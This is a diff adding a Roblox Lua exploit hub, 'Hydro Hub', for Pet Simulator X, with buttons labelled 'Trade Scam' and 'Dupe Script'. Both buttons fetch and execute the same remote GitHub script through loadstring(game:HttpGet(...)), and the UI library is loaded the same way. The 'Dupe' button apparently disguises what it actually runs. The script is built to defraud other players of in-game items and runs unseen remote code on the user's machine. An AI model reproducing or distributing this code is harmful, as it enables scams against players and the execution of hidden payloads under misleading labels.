@@ -1,0 +1,85 @@
+local OrionLib = loadstring(game:HttpGet(('https://raw.githubusercontent.com/shlexware/Orion/main/source')))()
+local Player = game.Players.LocalPlayer
+local Window = OrionLib:MakeWindow({Name = "Welcome to ! Hydro Hub V1.0", HidePremium = false, SaveConfig = true, IntroEnabled = false})
+
+OrionLib:MakeNotification({
+	Name = "Logged in!",
+	Content = "You are logged in as "..Player.Name.." ",
+	Image = "rbxassetid://4483345998",
+	Time = 5
+})
+
+local Tab = Window:MakeTab({
+	Name = "Trade Scam",
+	Icon = "rbxassetid://4483345998",
+	PremiumOnly = false
+})
+
+local Section = Tab:AddSection({
+	Name = "Pet Simulator X"
+})
+
+Tab:AddButton({
+	Name = "Trade Scam",
+	Callback = function() loadstring(game:HttpGet("https://raw.githubusercontent.com/Towdyyyy/scripts/main/Blacklist%20PSX", true))()
+        OrionLib:MakeNotification({
+            Name = "Script Successful executed",
+            Content = "Sometimes it's may take longer",
+            Image = "rbxassetid://4483345998",
+            Time = 5
+        })
+      		print("Executing Trade Scam Script!")
+  	end    
+})
+
+local Tab = Window:MakeTab({
+	Name = "Dupe Script",
+	Icon = "rbxassetid://4483345998",
+	PremiumOnly = false
+})
+
+local Section = Tab:AddSection({
+	Name = "Pet Simulator X"
+})
+
+Tab:AddButton({
+	Name = "Dupe Script",
+	Callback = function() loadstring(game:HttpGet("https://raw.githubusercontent.com/Towdyyyy/scripts/main/Blacklist%20PSX", true))()
+        OrionLib:MakeNotification({
+            Name = "Script Successful executed",
+            Content = "Sometimes it's may take longer",
+            Image = "rbxassetid://4483345998",
+            Time = 5
+        })
+      		print("Executing Dupe Script!")
+  	end    
+})
+
+local Tab = Window:MakeTab({
+	Name = "Misc",
+	Icon = "rbxassetid://4483345998",
+	PremiumOnly = false
+})
+
+local Section = Tab:AddSection({
+	Name = "Misc"
+})
+Tab:AddLabel("Credits to Hydro and Spyro")
+
+Tab:AddButton({
+	Name = "Discord Link(Copy)",
+	Callback = function()
+        local hey = "https://discord.gg/QKmhhq4MaR"
+        setclipboard(hey)
+      		print("button pressed")
+  	end    
+})
+
+Tab:AddButton({
+	Name = "Destroy Gui",
+	Callback = function() OrionLib:Destroy()
+      		print("button pressed")
+  	end    
+})
+
+OrionLib:Init()
